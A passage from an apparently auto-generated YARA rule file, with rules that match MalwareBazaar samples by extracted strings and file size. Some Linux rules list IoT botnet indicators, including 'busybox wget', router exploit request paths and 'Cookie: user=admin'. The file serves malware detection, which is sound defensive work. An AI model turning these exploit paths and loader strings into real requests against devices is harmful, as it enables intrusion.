        $s18 = "GetClassNameA"
        $s19 = "GetWindowTextA"
        $s20 = "ShowWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1416KB and
        all of them
}

rule Windows_577630ab8871c11387fde67ae8791d81f96e3d3ec8db98a58ed5346c59f51229
{
    meta:
        description = "Auto ML: 577630ab8871c11387fde67ae8791d81f96e3d3ec8db98a58ed5346c59f51229"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GAIsProcessorFeaturePresent"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 352KB and
        all of them
}

rule Windows_06e41eef7cd522feb5cd03df1821589f5ed697177c3e9c317cb844a50edbe17d
{
    meta:
        description = "Auto ML: 06e41eef7cd522feb5cd03df1821589f5ed697177c3e9c317cb844a50edbe17d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = ".rsrc"
        $s4 = "Module1"
        $s5 = "Module2"
        $s6 = "Module3"
        $s7 = "Module5"
        $s8 = "Module7"
        $s9 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB"
        $s10 = "InternetOpenUrlA"
        $s11 = "wininet.dll"
        $s12 = "InternetOpenA"
        $s13 = "InternetReadFile"
        $s14 = "InternetCloseHandle"
        $s15 = "user32"
        $s16 = "GetInputState"
        $s17 = "BCryptCloseAlgorithmProvider"
        $s18 = "BCryptSetProperty"
        $s19 = "BCryptOpenAlgorithmProvider"
        $s20 = "kernel32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 412KB and
        all of them
}

rule Windows_5777ea688bb402f1f457e10852509ccbe1278a6ff546662516b2f963e8dd5dae
{
    meta:
        description = "Auto ML: 5777ea688bb402f1f457e10852509ccbe1278a6ff546662516b2f963e8dd5dae"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 294KB and
        all of them
}

rule Windows_5805ba05b4054885a03cfcfaa9a114a9779f588ed93f2ca4ba7a0398645434de
{
    meta:
        description = "Auto ML: 5805ba05b4054885a03cfcfaa9a114a9779f588ed93f2ca4ba7a0398645434de"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Remote.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{FC706C1C-7076-46EE-BFCD-D82A039A23BE}"
        $s15 = "D7Z9M76Nq7gNcmDRcY"
        $s16 = "<Module>{5068784f-1291-4869-9885-4410ea37c12f}"
        $s17 = "get_Days"
        $s18 = "kernel32.dll"
        $s19 = "CreateRemoteThread"
        $s20 = "System.IO"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1176KB and
        all of them
}

rule Windows_5808dc380418fc0add23fdcd7aeb82a4255955874c8242490d678f962bf0292b
{
    meta:
        description = "Auto ML: 5808dc380418fc0add23fdcd7aeb82a4255955874c8242490d678f962bf0292b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<DeleteSelectedNodes>b__50_0"
        $s5 = "<GetInputs>b__66_0"
        $s6 = "<get_OutputSocket>b__17_0"
        $s7 = "<GetOutputs>b__67_0"
        $s8 = "<get_InputSocket>b__19_0"
        $s9 = "<GetNodes>b__0"
        $s10 = "<DeleteSelectedNodes>b__50_1"
        $s11 = "get_Panel1"
        $s12 = "ReadInt32"
        $s13 = "<DeleteSelectedNodes>b__50_2"
        $s14 = "get_Panel2"
        $s15 = "<DeleteSelectedNodes>b__3"
        $s16 = "<DeleteSelectedNodes>b__50_4"
        $s17 = "<Module>"
        $s18 = "System.Drawing.Drawing2D"
        $s19 = "System.IO"
        $s20 = "GetObjectData"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 667KB and
        all of them
}

rule Windows_581412f08e3333ebe7a4661f982106b1e395d3c8f384107df71db4768faec0c8
{
    meta:
        description = "Auto ML: 581412f08e3333ebe7a4661f982106b1e395d3c8f384107df71db4768faec0c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 313KB and
        all of them
}

rule Windows_583a2d1876ab1fe9703ac09dcd8a6a67cc86482f443691f343f4b2b4ec29dd0e
{
    meta:
        description = "Auto ML: 583a2d1876ab1fe9703ac09dcd8a6a67cc86482f443691f343f4b2b4ec29dd0e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1210KB and
        all of them
}

rule Windows_583dbeb5648d05035fa5cfebf1539b1537878e68dafd78c29f40058db1605162
{
    meta:
        description = "Auto ML: 583dbeb5648d05035fa5cfebf1539b1537878e68dafd78c29f40058db1605162"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Linux_5847b5c5b873f9a26d1aa449603ab7eb76107d6008ba6ed52fb1eff98fcba2d2
{
    meta:
        description = "Auto ML: 5847b5c5b873f9a26d1aa449603ab7eb76107d6008ba6ed52fb1eff98fcba2d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 149KB and
        all of them
}

rule Windows_5869f52973c259389b302074c98b95068044c557c5f3dc50d3412b4f3108780c
{
    meta:
        description = "Auto ML: 5869f52973c259389b302074c98b95068044c557c5f3dc50d3412b4f3108780c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
        $s9 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "kernel32.dll"
        $s13 = "user32.dll"
        $s14 = "advapi32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "shell32.dll"
        $s17 = "version.dll"
        $s18 = "MSVCRT.dll"
        $s19 = "GetModuleHandleA"
        $s20 = "GetProcAddress"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1447KB and
        all of them
}

rule Linux_58bf0983bd65c872a9560cc43f0fde0c2072c83b809211608719810244a14805
{
    meta:
        description = "Auto ML: 58bf0983bd65c872a9560cc43f0fde0c2072c83b809211608719810244a14805"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB and
        all of them
}

rule Linux_58fa77f6b8a2d565631eb153ce585d5292056bd44cce5f86edf2a5190208d88e
{
    meta:
        description = "Auto ML: 58fa77f6b8a2d565631eb153ce585d5292056bd44cce5f86edf2a5190208d88e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/system"
        $s2 = "/ (deleted)"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "Windows XP"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 72KB and
        all of them
}

rule Windows_00c4073d3cece00275c1e1be5147340362b989177852b7980ba31f0c07ae836d
{
    meta:
        description = "Auto ML: 00c4073d3cece00275c1e1be5147340362b989177852b7980ba31f0c07ae836d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = ".rsrc"
        $s4 = "sFilename"
        $s5 = "Module1"
        $s6 = "Module2"
        $s7 = "Module3"
        $s8 = "Module5"
        $s9 = "Module7"
        $s10 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB"
        $s11 = "wininet.dll"
        $s12 = "InternetOpenA"
        $s13 = "BCryptCloseAlgorithmProvider"
        $s14 = "InternetOpenUrlA"
        $s15 = "InternetReadFile"
        $s16 = "InternetCloseHandle"
        $s17 = "user32"
        $s18 = "GetInputState"
        $s19 = "BCryptSetProperty"
        $s20 = "BCryptOpenAlgorithmProvider"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 413KB and
        all of them
}

rule Windows_070e800de6c83d551f92272fbe848fc5e66ba5865521131eea114fe330f8f0fa
{
    meta:
        description = "Auto ML: 070e800de6c83d551f92272fbe848fc5e66ba5865521131eea114fe330f8f0fa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "/7\"seTHi"
        $s4 = "processorArchitecture=\"X86\""
        $s5 = "name=\"Enigma.exe\""
        $s6 = "type=\"win32\" />"
        $s7 = "type=\"win32\""
        $s8 = "name=\"Microsoft.Windows.Common-Controls\""
        $s9 = "processorArchitecture=\"X86\""
        $s10 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s11 = "http://pki-ocsp.symauth.com0"
        $s12 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s13 = "kernel32.dll"
        $s14 = "user32.dll"
        $s15 = "advapi32.dll"
        $s16 = "oleaut32.dll"
        $s17 = "shell32.dll"
        $s18 = "version.dll"
        $s19 = "CRYPT32.dll"
        $s20 = "SHLWAPI.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB and
        all of them
}

rule Windows_5931b9bb54cd619e0e0518c4e61654a3c154b59e72428698ea3f381cabaad213
{
    meta:
        description = "Auto ML: 5931b9bb54cd619e0e0518c4e61654a3c154b59e72428698ea3f381cabaad213"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "get_yyOS"
        $s7 = "System.Data"
        $s8 = "Load"
        $s9 = "set_Enabled"
        $s10 = "get_DataSource"
        $s11 = "set_DataSource"
        $s12 = "set_AutoScaleMode"
        $s13 = "set_ColumnHeadersHeightSizeMode"
        $s14 = "get_IdLotFabricatie"
        $s15 = "set_IdLotFabricatie"
        $s16 = "get_UnitateMasuraMateriale"
        $s17 = "set_UnitateMasuraMateriale"
        $s18 = "get_NumeMateriale"
        $s19 = "set_NumeMateriale"
        $s20 = "get_NrMateriale"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 670KB and
        all of them
}

rule Windows_5982ee2f9702075b4dbc970ed9d8e142830ea74e35554c9e46ebacf2d42702c9
{
    meta:
        description = "Auto ML: 5982ee2f9702075b4dbc970ed9d8e142830ea74e35554c9e46ebacf2d42702c9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "t7W2yI51nCoz,System.Private.CoreLib"
        $s7 = "4System.Private.CoreLib.dll"
        $s8 = "4System.Diagnostics.Process"
        $s9 = "<System.Diagnostics.Process.dll"
        $s10 = "@System.ComponentModel.Primitives"
        $s11 = "HSystem.ComponentModel.Primitives.dll"
        $s12 = "$System.ObjectModel"
        $s13 = ",System.ObjectModel.dll"
        $s14 = "System.Linq"
        $s15 = "System.Linq.dll"
        $s16 = "System"
        $s17 = "System.dllFSystem.ComponentModel.TypeConverter"
        $s18 = "NSystem.ComponentModel.TypeConverter.dll"
        $s19 = ":System.Collections.NonGeneric"
        $s20 = "BSystem.Collections.NonGeneric.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5666KB and
        all of them
}

rule Windows_59c9c77894c004b5c79f2f6d77744f6f1639c2b5604d1ce6e0e9c42e24adb3a4
{
    meta:
        description = "Auto ML: 59c9c77894c004b5c79f2f6d77744f6f1639c2b5604d1ce6e0e9c42e24adb3a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "SystemFuH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = "kernel32H9"
        $s17 = ".dllu"
        $s18 = ">.exeu"
        $s19 = "thread"
        $s20 = "Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2704KB and
        all of them
}

rule Windows_59cfbef2d28f5f8df3c98d8525acf710bbad31e3bed87ccb6d8c3d9f5a9d8fe4
{
    meta:
        description = "Auto ML: 59cfbef2d28f5f8df3c98d8525acf710bbad31e3bed87ccb6d8c3d9f5a9d8fe4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "DeleteFileW"
        $s8 = "FindFirstFileW"
        $s9 = "FindNextFileW"
        $s10 = "FindClose"
        $s11 = "SetFilePointer"
        $s12 = "ReadFile"
        $s13 = "GetPrivateProfileStringW"
        $s14 = "WritePrivateProfileStringW"
        $s15 = "LoadLibraryExW"
        $s16 = "GetModuleHandleW"
        $s17 = "CloseHandle"
        $s18 = "SetFileTime"
        $s19 = "CompareFileTime"
        $s20 = "GetShortPathNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 243KB and
        all of them
}

rule Windows_59f63e0e010518db4d6b1d6d1a7e7620fef5e05685d0756112a713278efef5b4
{
    meta:
        description = "Auto ML: 59f63e0e010518db4d6b1d6d1a7e7620fef5e05685d0756112a713278efef5b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4432KB and
        all of them
}

rule Windows_5a07ce7ac40cf63a88b65828aa2bbcb3e96e623daf3775dbd23c9492e31f76d2
{
    meta:
        description = "Auto ML: 5a07ce7ac40cf63a88b65828aa2bbcb3e96e623daf3775dbd23c9492e31f76d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "XCmdl"
        $s7 = "BCMDv"
        $s8 = "reaD"
        $s9 = "SeThw+"
        $s10 = "Wgdiplus.dll"
        $s11 = "CreateCompatibleBitmap"
        $s12 = "ExitProcess"
        $s13 = "SHELL32.dll"
        $s14 = "GetVersionExA"
        $s15 = "GETd"
        $s16 = "uGETpe"
        $s17 = "GETl"
        $s18 = "yHnJBCwWIN"
        $s19 = "GetModuleHandleA"
        $s20 = "SHLWAPI.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5893KB and
        all of them
}

rule Linux_5a0b0ae84cb32f1eadd65aa8f0170aace11fb23e8eee730dd6ec23ff80a1155b
{
    meta:
        description = "Auto ML: 5a0b0ae84cb32f1eadd65aa8f0170aace11fb23e8eee730dd6ec23ff80a1155b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 39KB and
        all of them
}

rule Windows_5a47f3a1d1f7f121b7407af0e3ad0bbda02a286891f03ef70af2a7e31bdf237c
{
    meta:
        description = "Auto ML: 5a47f3a1d1f7f121b7407af0e3ad0bbda02a286891f03ef70af2a7e31bdf237c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB and
        all of them
}

rule Linux_5a4cc38c57bcf72e2bb845ef9e9da6ecd659b565f46605d158c7205d4f4f587c
{
    meta:
        description = "Auto ML: 5a4cc38c57bcf72e2bb845ef9e9da6ecd659b565f46605d158c7205d4f4f587c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 196KB and
        all of them
}

rule Windows_5aad4e2ad582c6fe27f4f7d2a9c526115cf40f9227385cb9e2c5d160c85bf11b
{
    meta:
        description = "Auto ML: 5aad4e2ad582c6fe27f4f7d2a9c526115cf40f9227385cb9e2c5d160c85bf11b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s8 = "DeleteFileA"
        $s9 = "FindFirstFileA"
        $s10 = "FindNextFileA"
        $s11 = "FindClose"
        $s12 = "SetFilePointer"
        $s13 = "ReadFile"
        $s14 = "WriteFile"
        $s15 = "GetPrivateProfileStringA"
        $s16 = "WritePrivateProfileStringA"
        $s17 = "GetProcAddress"
        $s18 = "LoadLibraryExA"
        $s19 = "GetModuleHandleA"
        $s20 = "GetExitCodeProcess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 585KB and
        all of them
}

rule Windows_077f33dfd672e500ae63b6ee7f3da690f49e2b686480a95004833981ec795504
{
    meta:
        description = "Auto ML: 077f33dfd672e500ae63b6ee7f3da690f49e2b686480a95004833981ec795504"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "DeleteFileW"
        $s8 = "FindFirstFileW"
        $s9 = "FindNextFileW"
        $s10 = "FindClose"
        $s11 = "SetFilePointer"
        $s12 = "ReadFile"
        $s13 = "GetPrivateProfileStringW"
        $s14 = "WritePrivateProfileStringW"
        $s15 = "LoadLibraryExW"
        $s16 = "GetModuleHandleW"
        $s17 = "CloseHandle"
        $s18 = "SetFileTime"
        $s19 = "CompareFileTime"
        $s20 = "GetShortPathNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 72991KB and
        all of them
}

rule Linux_5ab1799f88ef9e58b4077c20bfea8711fe38691cc3b9470b7f99e7d21830573f
{
    meta:
        description = "Auto ML: 5ab1799f88ef9e58b4077c20bfea8711fe38691cc3b9470b7f99e7d21830573f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "/proc/%d/cmdline"
        $s5 = "wget"
        $s6 = "/usr/lib/systemd/systemd"
        $s7 = "/usr/libexec/openssh/sftp-server"
        $s8 = "shell"
        $s9 = "httpd"
        $s10 = "system"
        $s11 = "No such file or directory"
        $s12 = "No such process"
        $s13 = "Interrupted system call"
        $s14 = "Bad file descriptor"
        $s15 = "No child processes"
        $s16 = "Resource temporarily unavailable"
        $s17 = "File exists"
        $s18 = "Too many open files in system"
        $s19 = "Too many open files"
        $s20 = "Text file busy"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 66KB and
        all of them
}

rule Windows_5abd6f4f7252ac98279db7727c79c5600870725fac5f8b883241a0265952fd69
{
    meta:
        description = "Auto ML: 5abd6f4f7252ac98279db7727c79c5600870725fac5f8b883241a0265952fd69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Core"
        $s13 = "System.Security"
        $s14 = "SecurityRuleSet"
        $s15 = "islands_and_continents_of_the_planet.exe"
        $s16 = "<Module>"
